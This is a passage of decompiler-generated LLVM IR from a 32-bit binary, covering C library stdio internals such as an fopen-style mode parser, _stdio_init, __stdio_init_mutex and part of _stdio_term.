  store i32 %v4_8050857, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_8050867 = load i8, i8* %arg2, align 1
  %v3_8050867 = zext i8 %v2_8050867 to i32
  %v4_8050867 = load i32, i32* @eax, align 4
  %v5_8050867 = and i32 %v4_8050867, -256
  %v6_8050867 = or i32 %v5_8050867, %v3_8050867
  store i32 %v6_8050867, i32* %eax.global-to-local, align 4
  %v10_8050869 = icmp eq i8 %v2_8050867, 114
  br i1 %v10_8050869, label %dec_label_pc_80508ab, label %dec_label_pc_805086d

dec_label_pc_805086d:                             ; preds = %entry
  %v10_805086d = icmp eq i8 %v2_8050867, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_805086d, label %dec_label_pc_80508ad, label %dec_label_pc_8050876

dec_label_pc_8050876:                             ; preds = %dec_label_pc_805086d
  %v10_8050876 = icmp eq i8 %v2_8050867, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_8050876, label %dec_label_pc_80508ad, label %dec_label_pc_805087e

dec_label_pc_805087e:                             ; preds = %dec_label_pc_8050926, %dec_label_pc_8050900, %dec_label_pc_8050876
  %v0_805087e = load i32, i32* %stack_var_-16, align 4
  %v1_805087e = call i32 @__errno_location(i32 %v0_805087e)
  store i32 %v1_805087e, i32* %eax.global-to-local, align 4
  %v0_8050883 = load i32, i32* @ebp, align 4
  %v1_8050883 = icmp eq i32 %v0_8050883, 0
  %v1_8050885 = inttoptr i32 %v1_805087e to i32*
  store i32 22, i32* %v1_8050885, align 4
  br i1 %v1_8050883, label %dec_label_pc_8050a87, label %dec_label_pc_8050891

dec_label_pc_8050891:                             ; preds = %dec_label_pc_8050949, %dec_label_pc_805087e
  %v0_8050891 = load i32, i32* @ebp, align 4
  %v1_8050891 = add i32 %v0_8050891, 1
  %v2_8050891 = inttoptr i32 %v1_8050891 to i8*
  %v3_8050891 = load i8, i8* %v2_8050891, align 1
  %v4_8050891 = and i8 %v3_8050891, 32
  %v5_8050891 = icmp eq i8 %v4_8050891, 0
  br i1 %v5_8050891, label %dec_label_pc_8050a87, label %dec_label_pc_805089b

dec_label_pc_805089b:                             ; preds = %dec_label_pc_8050891
  store i32 %v0_8050891, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_80508a1 = call i32 @free(i32 %v0_8050891)
  br label %dec_label_pc_8050a82

dec_label_pc_80508ab:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80508ad

dec_label_pc_80508ad:                             ; preds = %dec_label_pc_8050876, %dec_label_pc_805086d, %dec_label_pc_80508ab
  %v0_80508be = phi i32 [ 1089, %dec_label_pc_8050876 ], [ 577, %dec_label_pc_805086d ], [ 0, %dec_label_pc_80508ab ]
  %v1_80508ad = add i32 %v4_8050857, 1
  %v2_80508ad = inttoptr i32 %v1_80508ad to i8*
  %v3_80508ad = load i8, i8* %v2_80508ad, align 1
  %v12_80508ad = icmp eq i8 %v3_80508ad, 98
  %v1_80508ad.v4_8050857 = select i1 %v12_80508ad, i32 %v1_80508ad, i32 %v4_8050857
  store i32 %v1_80508ad.v4_8050857, i32* %eax.global-to-local, align 4
  %v1_80508b8 = add i32 %v1_80508ad.v4_8050857, 1
  %v2_80508b8 = inttoptr i32 %v1_80508b8 to i8*
  %v3_80508b8 = load i8, i8* %v2_80508b8, align 1
  %v12_80508b8 = icmp eq i8 %v3_80508b8, 43
  %v1_80508bc = icmp eq i1 %v12_80508b8, false
  br i1 %v1_80508bc, label %dec_label_pc_80508c6, label %dec_label_pc_80508be

dec_label_pc_80508be:                             ; preds = %dec_label_pc_80508ad
  %v1_80508c0 = or i32 %v0_80508be, 1
  store i32 %v1_80508c0, i32* %eax.global-to-local, align 4
  %v1_80508c3 = add nuw nsw i32 %v1_80508c0, 1
  store i32 %v1_80508c3, i32* @ebx, align 4
  br label %dec_label_pc_80508c6

dec_label_pc_80508c6:                             ; preds = %dec_label_pc_80508ad, %dec_label_pc_80508be
  %v0_80509497 = phi i32 [ %v0_80508be, %dec_label_pc_80508ad ], [ %v1_80508c3, %dec_label_pc_80508be ]
  %v1_80508c6 = icmp eq i32 %arg3, 0
  %v1_80508c8 = icmp eq i1 %v1_80508c6, false
  br i1 %v1_80508c8, label %dec_label_pc_80508fc, label %dec_label_pc_80508ca

dec_label_pc_80508ca:                             ; preds = %dec_label_pc_80508c6
  store i32 80, i32* %stack_var_-76, align 4
  %v1_80508cf = call i32 @malloc(i32 80)
  store i32 %v1_80508cf, i32* %eax.global-to-local, align 4
  %v2_80508d7 = icmp eq i32 %v1_80508cf, 0
  store i32 %v1_80508cf, i32* @ebp, align 4
  br i1 %v2_80508d7, label %dec_label_pc_8050a89, label %dec_label_pc_80508e1

dec_label_pc_80508e1:                             ; preds = %dec_label_pc_80508ca
  %v2_80508cf = inttoptr i32 %v1_80508cf to i16*
  store i16 8192, i16* %v2_80508cf, align 2
  %v2_80508e9 = add i32 %v1_80508cf, 8
  %v3_80508e9 = inttoptr i32 %v2_80508e9 to i32*
  store i32 0, i32* %v3_80508e9, align 4
  %v2_80508f0 = add i32 %v1_80508cf, 56
  store i32 %v2_80508f0, i32* %eax.global-to-local, align 4
  store i32 %v2_80508f0, i32* %stack_var_-76, align 4
  %v1_80508f4 = call i32 @__stdio_init_mutex(i32 %v2_80508f0)
  store i32 %v1_80508f4, i32* %eax.global-to-local, align 4
  %v0_8050949.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80508fc

dec_label_pc_80508fc:                             ; preds = %dec_label_pc_80508c6, %dec_label_pc_80508e1
  %v2_805094f = phi i32 [ %v0_80509497, %dec_label_pc_80508c6 ], [ %v0_8050949.pre, %dec_label_pc_80508e1 ]
  %v2_80508fc = icmp slt i32 %arg4, 0
  br i1 %v2_80508fc, label %dec_label_pc_8050949, label %dec_label_pc_8050900

dec_label_pc_8050900:                             ; preds = %dec_label_pc_80508fc
  %v1_8050902 = and i32 %v2_805094f, 32771
  %v1_8050908 = add nuw nsw i32 %v1_8050902, 1
  store i32 %v1_8050908, i32* @edx, align 4
  %v0_8050909 = load i32, i32* @esi, align 4
  %v1_8050909 = add i32 %v0_8050909, 1
  %v2_805090c = and i32 %v1_8050909, %v1_8050908
  store i32 %v2_805090c, i32* %eax.global-to-local, align 4
  %v12_805090e = icmp eq i32 %v2_805090c, %v1_8050908
  %v1_8050910 = load i32, i32* @ebp, align 4
  %v2_8050910 = add i32 %v1_8050910, 4
  %v3_8050910 = inttoptr i32 %v2_8050910 to i32*
  store i32 %arg4, i32* %v3_8050910, align 4
  %v1_8050913 = icmp eq i1 %v12_805090e, false
  br i1 %v1_8050913, label %dec_label_pc_805087e, label %dec_label_pc_8050919

dec_label_pc_8050919:                             ; preds = %dec_label_pc_8050900
  %v0_8050919 = load i32, i32* @esi, align 4
  %v1_805091b = and i32 %v0_8050919, 1024
  %v1_805091d = xor i32 %v1_805091b, 1024
  store i32 %v1_805091d, i32* %eax.global-to-local, align 4
  %v1_8050922 = load i32, i32* @ebx, align 4
  %v2_8050922 = and i32 %v1_8050922, %v1_805091d
  %v3_8050922 = icmp eq i32 %v2_8050922, 0
  br i1 %v3_8050922, label %dec_label_pc_8050919.dec_label_pc_805093f_crit_edge, label %dec_label_pc_8050926

dec_label_pc_8050919.dec_label_pc_805093f_crit_edge: ; preds = %dec_label_pc_8050919
  br label %dec_label_pc_805093f

dec_label_pc_8050926:                             ; preds = %dec_label_pc_8050919
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_805092f = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_805092f, i32* %eax.global-to-local, align 4
  %v1_8050937 = icmp eq i32 %v3_805092f, 0
  %v1_8050939 = icmp eq i1 %v1_8050937, false
  br i1 %v1_8050939, label %dec_label_pc_805087e, label %dec_label_pc_8050926.dec_label_pc_805093f_crit_edge

dec_label_pc_8050926.dec_label_pc_805093f_crit_edge: ; preds = %dec_label_pc_8050926
  %v0_805093f.pre = load i32, i32* @esi, align 4
  %v0_8050945.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805093f

dec_label_pc_805093f:                             ; preds = %dec_label_pc_8050919.dec_label_pc_805093f_crit_edge, %dec_label_pc_8050926.dec_label_pc_805093f_crit_edge
  %v0_8050945 = phi i32 [ %v1_8050922, %dec_label_pc_8050919.dec_label_pc_805093f_crit_edge ], [ %v0_8050945.pre, %dec_label_pc_8050926.dec_label_pc_805093f_crit_edge ]
  %v0_805093f = phi i32 [ %v0_8050919, %dec_label_pc_8050919.dec_label_pc_805093f_crit_edge ], [ %v0_805093f.pre, %dec_label_pc_8050926.dec_label_pc_805093f_crit_edge ]
  %v1_805093f = and i32 %v0_805093f, 32768
  %v2_8050945 = or i32 %v1_805093f, %v0_8050945
  store i32 %v2_8050945, i32* @ebx, align 4
  br label %dec_label_pc_805096d

dec_label_pc_8050949:                             ; preds = %dec_label_pc_80508fc
  %v11_805094b = or i32 %v2_805094f, 32768
  store i32 %v11_805094b, i32* %eax.global-to-local, align 4
  %v1_805094e = add i32 %arg4, 1
  %v8_805094e = icmp eq i32 %v1_805094e, 0
  store i32 %v1_805094e, i32* @edi, align 4
  %v1_805094f = icmp eq i1 %v8_805094e, false
  %v4_805094f = select i1 %v1_805094f, i32 %v11_805094b, i32 %v2_805094f
  store i32 %v4_805094f, i32* @ebx, align 4
  %v0_8050959 = load i32, i32* @esi, align 4
  store i32 %v0_8050959, i32* %stack_var_-76, align 4
  %v3_805095a = inttoptr i32 %v0_8050959 to i8*
  %v4_805095a = call i32 @__libc_open(i8* %v3_805095a, i32 %v4_805094f)
  store i32 %v4_805095a, i32* %eax.global-to-local, align 4
  %v2_8050962 = icmp slt i32 %v4_805095a, 0
  %v1_8050964 = load i32, i32* @ebp, align 4
  %v2_8050964 = add i32 %v1_8050964, 4
  %v3_8050964 = inttoptr i32 %v2_8050964 to i32*
  store i32 %v4_805095a, i32* %v3_8050964, align 4
  br i1 %v2_8050962, label %dec_label_pc_8050891, label %dec_label_pc_805096d

dec_label_pc_805096d:                             ; preds = %dec_label_pc_8050949, %dec_label_pc_805093f
  %v0_805096d = load i32, i32* @ebp, align 4
  %v1_805096d = inttoptr i32 %v0_805096d to i32*
  %v2_805096d = load i32, i32* %v1_805096d, align 4
  %v2_805096d.tr = trunc i32 %v2_805096d to i16
  %v1_8050975 = and i16 %v2_805096d.tr, 8192
  %v3_8050975 = inttoptr i32 %v0_805096d to i16*
  store i16 %v1_8050975, i16* %v3_8050975, align 2
  %v0_8050979 = load i32, i32* @ebx, align 4
  store i32 %v0_8050979, i32* %eax.global-to-local, align 4
  %v1_805097b = and i32 %v0_8050979, -31744
  %v0_8050981 = load i32, i32* @ebp, align 4
  %v1_8050981 = inttoptr i32 %v0_8050981 to i32*
  %v2_8050981 = load i32, i32* %v1_8050981, align 4
  %v1_8050984 = mul i32 %v0_8050979, 16
  %v1_8050987 = and i32 %v1_8050984, 48
  %v1_8050988 = add nuw nsw i32 %v1_8050987, 16
  %v2_805098b = xor i32 %v1_8050988, 48
  %v2_805098e = or i32 %v2_8050981, %v1_805097b
  %v2_8050990 = or i32 %v2_805098e, %v2_805098b
  store i32 %v2_8050990, i32* %eax.global-to-local, align 4
  %v1_8050992 = trunc i32 %v2_8050990 to i16
  %v3_8050992 = inttoptr i32 %v0_8050981 to i16*
  store i16 %v1_8050992, i16* %v3_8050992, align 2
  %v0_8050996 = load i32, i32* %stack_var_-76, align 4
  %v1_8050996 = call i32 @__errno_location(i32 %v0_8050996)
  store i32 %v1_8050996, i32* %eax.global-to-local, align 4
  %v0_805099e = load i32, i32* @ebp, align 4
  %v1_805099e = inttoptr i32 %v0_805099e to i16*
  %v2_805099e = load i16, i16* %v1_805099e, align 2
  %v3_805099e = zext i16 %v2_805099e to i32
  store i32 %v3_805099e, i32* @ebx, align 4
  %v1_80509a2 = inttoptr i32 %v1_8050996 to i32*
  %v2_80509a2 = load i32, i32* %v1_80509a2, align 4
  store i32 %v2_80509a2, i32* @edi, align 4
  store i32 %v1_8050996, i32* @esi, align 4
  %v1_80509a6 = add i32 %v0_805099e, 4
  %v2_80509a6 = inttoptr i32 %v1_80509a6 to i32*
  %v3_80509a6 = load i32, i32* %v2_80509a6, align 4
  store i32 %v3_80509a6, i32* %stack_var_-76, align 4
  %v1_80509a9 = call i32 @isatty(i32 %v3_80509a6)
  %v2_80509b1 = mul i32 %v1_80509a9, 256
  store i32 %v2_80509b1, i32* %eax.global-to-local, align 4
  %v0_80509b4 = load i32, i32* @ebx, align 4
  %v2_80509b4 = or i32 %v0_80509b4, %v2_80509b1
  store i32 %v2_80509b4, i32* @ebx, align 4
  %v1_80509b6 = trunc i32 %v2_80509b4 to i16
  %v2_80509b6 = load i32, i32* @ebp, align 4
  %v3_80509b6 = inttoptr i32 %v2_80509b6 to i16*
  store i16 %v1_80509b6, i16* %v3_80509b6, align 2
  %v0_80509ba = load i32, i32* @edi, align 4
  %v1_80509ba = load i32, i32* @esi, align 4
  %v2_80509ba = inttoptr i32 %v1_80509ba to i32*
  store i32 %v0_80509ba, i32* %v2_80509ba, align 4
  %v0_80509bc = load i32, i32* @ebp, align 4
  %v1_80509bc = add i32 %v0_80509bc, 8
  %v2_80509bc = inttoptr i32 %v1_80509bc to i32*
  %v3_80509bc = load i32, i32* %v2_80509bc, align 4
  %v4_80509bc = icmp eq i32 %v3_80509bc, 0
  %v1_80509c0 = icmp eq i1 %v4_80509bc, false
  br i1 %v1_80509c0, label %dec_label_pc_80509f4, label %dec_label_pc_80509c2

dec_label_pc_80509c2:                             ; preds = %dec_label_pc_805096d
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_80509ca = call i32 @malloc(i32 4096)
  store i32 %v1_80509ca, i32* %eax.global-to-local, align 4
  %v1_80509d2 = icmp eq i32 %v1_80509ca, 0
  %v1_80509d4 = load i32, i32* @ebp, align 4
  %v2_80509d4 = add i32 %v1_80509d4, 8
  %v3_80509d4 = inttoptr i32 %v2_80509d4 to i32*
  store i32 %v1_80509ca, i32* %v3_80509d4, align 4
  br i1 %v1_80509d2, label %dec_label_pc_80509ed, label %dec_label_pc_80509d9

dec_label_pc_80509d9:                             ; preds = %dec_label_pc_80509c2
  %v1_80509d9 = add i32 %v1_80509ca, 4096
  store i32 %v1_80509d9, i32* %eax.global-to-local, align 4
  %v1_80509de = load i32, i32* @ebp, align 4
  %v2_80509de = add i32 %v1_80509de, 12
  %v3_80509de = inttoptr i32 %v2_80509de to i32*
  store i32 %v1_80509d9, i32* %v3_80509de, align 4
  %v0_80509e1 = load i32, i32* @ebp, align 4
  %v1_80509e1 = inttoptr i32 %v0_80509e1 to i32*
  %v2_80509e1 = load i32, i32* %v1_80509e1, align 4
  %v1_80509e4 = udiv i32 %v2_80509e1, 256
  %v3_80509e4 = and i32 %v1_80509e4, 191
  %v8_80509e4 = or i32 %v3_80509e4, 64
  %v10_80509e4 = mul nuw nsw i32 %v8_80509e4, 256
  %v11_80509e4 = and i32 %v2_80509e1, -65281
  %v12_80509e4 = or i32 %v10_80509e4, %v11_80509e4
  store i32 %v12_80509e4, i32* %eax.global-to-local, align 4
  %v1_80509e7 = trunc i32 %v12_80509e4 to i16
  %v3_80509e7 = inttoptr i32 %v0_80509e1 to i16*
  store i16 %v1_80509e7, i16* %v3_80509e7, align 2
  br label %dec_label_pc_80509f4

dec_label_pc_80509ed:                             ; preds = %dec_label_pc_80509c2
  %v0_80509ed = load i32, i32* @ebp, align 4
  %v1_80509ed = add i32 %v0_80509ed, 12
  %v2_80509ed = inttoptr i32 %v1_80509ed to i32*
  store i32 0, i32* %v2_80509ed, align 4
  br label %dec_label_pc_80509f4

dec_label_pc_80509f4:                             ; preds = %dec_label_pc_805096d, %dec_label_pc_80509d9, %dec_label_pc_80509ed
  %v0_80509f4 = load i32, i32* @ebp, align 4
  %v1_80509f4 = add i32 %v0_80509f4, 8
  %v2_80509f4 = inttoptr i32 %v1_80509f4 to i32*
  %v3_80509f4 = load i32, i32* %v2_80509f4, align 4
  store i32 %v3_80509f4, i32* %eax.global-to-local, align 4
  %v1_80509f7 = add i32 %v0_80509f4, 2
  %v2_80509f7 = inttoptr i32 %v1_80509f7 to i8*
  store i8 0, i8* %v2_80509f7, align 1
  %v0_80509fb = load i32, i32* @ebp, align 4
  %v1_80509fb = add i32 %v0_80509fb, 44
  %v2_80509fb = inttoptr i32 %v1_80509fb to i32*
  store i32 0, i32* %v2_80509fb, align 4
  %v0_8050a02 = load i32, i32* @ebp, align 4
  %v1_8050a02 = add i32 %v0_8050a02, 1
  %v2_8050a02 = inttoptr i32 %v1_8050a02 to i8*
  %v3_8050a02 = load i8, i8* %v2_8050a02, align 1
  %v4_8050a02 = and i8 %v3_8050a02, 32
  %v5_8050a02 = icmp eq i8 %v4_8050a02, 0
  %v0_8050a06 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050a06 = add i32 %v0_8050a02, 24
  %v3_8050a06 = inttoptr i32 %v2_8050a06 to i32*
  store i32 %v0_8050a06, i32* %v3_8050a06, align 4
  %v0_8050a09 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050a09 = load i32, i32* @ebp, align 4
  %v2_8050a09 = add i32 %v1_8050a09, 28
  %v3_8050a09 = inttoptr i32 %v2_8050a09 to i32*
  store i32 %v0_8050a09, i32* %v3_8050a09, align 4
  %v0_8050a0c = load i32, i32* %eax.global-to-local, align 4
  %v1_8050a0c = load i32, i32* @ebp, align 4
  %v2_8050a0c = add i32 %v1_8050a0c, 16
  %v3_8050a0c = inttoptr i32 %v2_8050a0c to i32*
  store i32 %v0_8050a0c, i32* %v3_8050a0c, align 4
  %v0_8050a0f = load i32, i32* %eax.global-to-local, align 4
  %v1_8050a0f = load i32, i32* @ebp, align 4
  %v2_8050a0f = add i32 %v1_8050a0f, 20
  %v3_8050a0f = inttoptr i32 %v2_8050a0f to i32*
  store i32 %v0_8050a0f, i32* %v3_8050a0f, align 4
  %v0_8050a12 = load i32, i32* @global_var_8062320.704, align 32
  store i32 %v0_8050a12, i32* @eax, align 4
  %v1_8050a17 = load i32, i32* @ebp, align 4
  %v2_8050a17 = add i32 %v1_8050a17, 52
  %v3_8050a17 = inttoptr i32 %v2_8050a17 to i32*
  store i32 %v0_8050a12, i32* %v3_8050a17, align 4
  br i1 %v5_8050a02, label %dec_label_pc_8050a89, label %dec_label_pc_8050a1c

dec_label_pc_8050a1c:                             ; preds = %dec_label_pc_80509f4
  %v2_8050a27 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050a27, i32* %stack_var_-76, align 4
  %v2_8050a2c = call i32 @__pthread_return_void(i32 %v2_8050a27, i32 134562299)
  store i32 %v2_8050a2c, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8062308.701 to i32), i32* %stack_var_-76, align 4
  %v1_8050a38 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062308.701 to i32))
  store i32 %v1_8050a38, i32* @eax, align 4
  %v2_8050a4a = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8050a4a, i32* %stack_var_-76, align 4
  %v2_8050a4f = call i32 @__pthread_return_void(i32 %v2_8050a4a, i32 134562299)
  store i32 %v2_8050a4f, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80622f0.705 to i32), i32* %stack_var_-76, align 4
  %v1_8050a5b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80622f0.705 to i32))
  %v0_8050a60 = load i32, i32* bitcast (i32** @global_var_80622ec.706 to i32*), align 4
  store i32 %v0_8050a60, i32* @eax, align 4
  %v1_8050a65 = load i32, i32* @ebp, align 4
  %v2_8050a65 = add i32 %v1_8050a65, 32
  %v3_8050a65 = inttoptr i32 %v2_8050a65 to i32*
  store i32 %v0_8050a60, i32* %v3_8050a65, align 4
  %v2_8050a68 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_8050a68, i32* @ecx, align 4
  %v0_8050a69 = load i32, i32* @ebp, align 4
  store i32 %v0_8050a69, i32* bitcast (i32** @global_var_80622ec.706 to i32*), align 4
  store i32 %v2_8050a4a, i32* %stack_var_-76, align 4
  %v2_8050a73 = call i32 @__pthread_return_void(i32 %v2_8050a4a, i32 1)
  store i32 %v2_8050a4a, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_8050a27, i32* %stack_var_-76, align 4
  %v2_8050a7d = call i32 @__pthread_return_void(i32 %v2_8050a27, i32 1)
  br label %dec_label_pc_8050a82

dec_label_pc_8050a82:                             ; preds = %dec_label_pc_805089b, %dec_label_pc_8050a1c
  %storemerge = phi i32 [ %v2_8050a7d, %dec_label_pc_8050a1c ], [ %v1_80508a1, %dec_label_pc_805089b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050a89

dec_label_pc_8050a87:                             ; preds = %dec_label_pc_8050891, %dec_label_pc_805087e
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8050a89

dec_label_pc_8050a89:                             ; preds = %dec_label_pc_80509f4, %dec_label_pc_80508ca, %dec_label_pc_8050a82, %dec_label_pc_8050a87
  %v0_8050a8c = load i32, i32* @ebp, align 4
  store i32 %v0_8050a8c, i32* %eax.global-to-local, align 4
  %v2_8050a8e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050a8e, i32* @ebx, align 4
  store i32 %v0_8050852, i32* @esi, align 4
  store i32 %v0_8050851, i32* @edi, align 4
  store i32 %v0_8050850, i32* @ebp, align 4
  ret i32 %v0_8050a8c

; uselistorder directives
  uselistorder i32 %v2_8050a4a, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8050a27, { 1, 0, 3, 2 }
  uselistorder i32 %v2_80509e1, { 1, 0 }
  uselistorder i32 %v1_80509ca, { 1, 2, 0, 3 }
  uselistorder i32 %v2_80509b1, { 1, 0 }
  uselistorder i32 %v1_8050996, { 1, 0, 2 }
  uselistorder i32 %v11_805094b, { 1, 0 }
  uselistorder i32 %v1_805091d, { 1, 0 }
  uselistorder i32 %v0_8050919, { 1, 0 }
  uselistorder i32 %v2_805094f, { 1, 0, 2 }
  uselistorder i32 %v1_80508cf, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 1, 27, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 2, 1, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_8050a89, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8050a82, { 1, 0 }
  uselistorder label %dec_label_pc_80509f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805093f, { 1, 0 }
  uselistorder label %dec_label_pc_80508fc, { 1, 0 }
  uselistorder label %dec_label_pc_80508c6, { 1, 0 }
  uselistorder label %dec_label_pc_80508ad, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050a95 = load i32, i32* @edi, align 4
  %v0_8050a96 = load i32, i32* @esi, align 4
  %v0_8050a97 = load i32, i32* @ebx, align 4
  store i32 %v0_8050a97, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_8050aa0 = call i32 @__errno_location(i32 %v0_8050a97)
  %v0_8050aa8 = load i16, i16* @global_var_8062340.697, align 64
  %v1_8050aa8 = zext i16 %v0_8050aa8 to i32
  store i32 %v1_8050aa8, i32* @esi, align 4
  %v1_8050aaf = inttoptr i32 %v1_8050aa0 to i32*
  %v2_8050aaf = load i32, i32* %v1_8050aaf, align 4
  store i32 %v2_8050aaf, i32* %ebp.global-to-local, align 4
  store i32 %v1_8050aa0, i32* @edi, align 4
  %v1_8050ab5 = call i32 @isatty(i32 0)
  %v0_8050aba = load i32, i32* @ebx, align 4
  %v2_8050ac3 = sub i32 %v0_8050aba, %v1_8050ab5
  %v2_8050ac7 = mul i32 %v2_8050ac3, 256
  %v0_8050aca = load i32, i32* @esi, align 4
  %v2_8050aca = xor i32 %v0_8050aca, %v2_8050ac7
  %v1_8050acc = trunc i32 %v2_8050aca to i16
  store i16 %v1_8050acc, i16* @global_var_8062340.697, align 64
  %v0_8050ad3 = load i16, i16* @global_var_8062390.698, align 16
  %v1_8050ad3 = zext i16 %v0_8050ad3 to i32
  store i32 %v1_8050ad3, i32* @esi, align 4
  %v1_8050ada = call i32 @isatty(i32 1)
  %v0_8050adf = load i32, i32* @ebx, align 4
  %v2_8050adf = sub i32 %v0_8050adf, %v1_8050ada
  %v2_8050ae1 = mul i32 %v2_8050adf, 256
  %v0_8050ae4 = load i32, i32* @esi, align 4
  %v2_8050ae4 = xor i32 %v2_8050ae1, %v0_8050ae4
  %v1_8050ae6 = trunc i32 %v2_8050ae4 to i16
  store i16 %v1_8050ae6, i16* @global_var_8062390.698, align 16
  %v0_8050aed = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050aed = load i32, i32* @edi, align 4
  %v2_8050aed = inttoptr i32 %v1_8050aed to i32*
  store i32 %v0_8050aed, i32* %v2_8050aed, align 4
  %v2_8050af2 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050af2, i32* @ebx, align 4
  store i32 %v0_8050a96, i32* @esi, align 4
  store i32 %v0_8050a95, i32* @edi, align 4
  ret i32 %v1_8050ada

; uselistorder directives
  uselistorder i32 %v1_8050aa0, { 1, 0 }
  uselistorder i16* @global_var_8062390.698, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8050b05 = inttoptr i32 %arg1 to i16*
  %v4_8050b05 = call i32 @memcpy(i16* %v3_8050b05, i32 ptrtoint (i32* @global_var_8060480.707 to i32), i32 24)
  ret i32 %v4_8050b05
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050b0e = load i32, i32* @esi, align 4
  %v0_8050b0f = load i32, i32* @ebx, align 4
  store i32 %v0_8050b0f, i32* %stack_var_-8, align 4
  %v1_8050b18 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80622f0.705 to i32))
  store i32 %v1_8050b18, i32* %eax.global-to-local, align 4
  %v1_8050b24 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8062308.701 to i32))
  store i32 %v1_8050b24, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_80622ec.706 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_8050b6e22 = icmp eq i32 %storemerge21, 0
  %v1_8050b7024 = icmp eq i1 %v1_8050b6e22, false
  br i1 %v1_8050b7024, label %dec_label_pc_8050b31.lr.ph, label %dec_label_pc_8050b8e.preheader

dec_label_pc_8050b31.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8050b31

dec_label_pc_8050b31:                             ; preds = %dec_label_pc_8050b31.lr.ph, %dec_label_pc_8050b58
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_8050b31.lr.ph ], [ %storemerge, %dec_label_pc_8050b58 ]
  %v1_8050b34 = add i32 %storemerge25, 56
  store i32 %v1_8050b34, i32* @esi, align 4
  %v1_8050b38 = call i32 @__pthread_return_0(i32 %v1_8050b34)
  store i32 %v1_8050b38, i32* %eax.global-to-local, align 4
  %v1_8050b40 = icmp eq i32 %v1_8050b38, 0
  br i1 %v1_8050b40, label %dec_label_pc_8050b58, label %dec_label_pc_8050b44

dec_label_pc_8050b44:                             ; preds = %dec_label_pc_8050b31
  %v0_8050b44 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050b44 = add i32 %v0_8050b44, 8
  %v2_8050b44 = inttoptr i32 %v1_8050b44 to i32*
  %v3_8050b44 = load i32, i32* %v2_8050b44, align 4
  store i32 %v3_8050b44, i32* %eax.global-to-local, align 4
  %v1_8050b47 = inttoptr i32 %v0_8050b44 to i16*
  store i16 48, i16* %v1_8050b47, align 2
  %v0_8050b4c = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b4c = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050b4c = add i32 %v1_8050b4c, 24
  %v3_8050b4c = inttoptr i32 %v2_8050b4c to i32*
  store i32 %v0_8050b4c, i32* %v3_8050b4c, align 4
  %v0_8050b4f = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b4f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050b4f = add i32 %v1_8050b4f, 28
  %v3_8050b4f = inttoptr i32 %v2_8050b4f to i32*
  store i32 %v0_8050b4f, i32* %v3_8050b4f, align 4
  %v0_8050b52 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b52 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050b52 = add i32 %v1_8050b52, 16
  %v3_8050b52 = inttoptr i32 %v2_8050b52 to i32*
  store i32 %v0_8050b52, i32* %v3_8050b52, align 4
  %v0_8050b55 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b55 = load i32, i32* %ebx.global-to-local, align 4
